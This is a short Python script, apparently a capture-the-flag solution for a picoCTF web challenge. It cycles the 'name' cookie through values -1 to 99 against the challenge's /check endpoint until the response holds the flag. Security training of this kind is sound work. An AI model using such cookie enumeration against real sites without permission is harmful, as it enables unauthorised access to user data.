import requests
import sys

url = "http://mercury.picoctf.net:64944/check"

def send_req(i):
	headers = {
		'Referer' : 'http://mercury.picoctf.net:64944/',
		'Cookie' : 'name='+str(i),
		'Connection' : 'close'
	}

	r = requests.get(url, headers=headers)
	
	if "pico" in r.text:
		return r.text

	return None

for i in range(-1, 100):
	print(i)
	ans = send_req(i)

	if ans:
		print(ans)
		sys.exit(0)
